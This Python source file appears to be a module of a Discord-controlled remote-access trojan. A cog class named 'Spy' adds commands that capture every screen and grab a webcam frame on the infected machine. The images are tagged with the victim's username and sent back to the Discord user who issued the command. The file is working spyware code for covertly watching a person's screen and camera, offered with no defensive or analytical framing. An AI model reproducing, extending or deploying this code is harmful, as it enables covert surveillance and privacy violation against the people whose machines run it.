import getpass
import os
import platform
import pwd
import re
import socket
import textwrap
import uuid
from datetime import datetime
from PIL import ImageGrab
from functools import partial
import discord
import psutil
import requests
import pyautogui
import cv2
import asyncio
import time
from discord.ext import commands


class Spy(commands.Cog, description="System Information"):

    def __init__(self, client: commands.Bot):
        self.client = client

    @commands.command()
    async def screenshot(self, ctx):
        try:
            ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save(r'temp.png')
            file = discord.File('temp.png', filename="temp.png")

            embed = discord.Embed(
                title=f"Screenshot {getpass.getuser()}'s Screen",
                description="",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_image(url="attachment://temp.png")
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(file=file, embed=embed)

            os.remove("temp.png")

        except Exception as e:
            await ctx.send(str(e))
            return

    @commands.command()
    async def webcam(self, ctx):
        try:
            camera = cv2.VideoCapture(0)
            return_value, image = camera.read()
            cv2.imwrite("temp.png", image)
            del(camera)
            file = discord.File('temp.png', filename="temp.png")

            embed = discord.Embed(
                title=f"Webcam of {getpass.getuser()}",
                description="",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_image(url="attachment://temp.png")
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(file=file, embed=embed)

            os.remove("temp.png")

        except Exception as e:
            await ctx.send(str(e))


def setup(client: commands.Bot):
    client.add_cog(Spy(client))
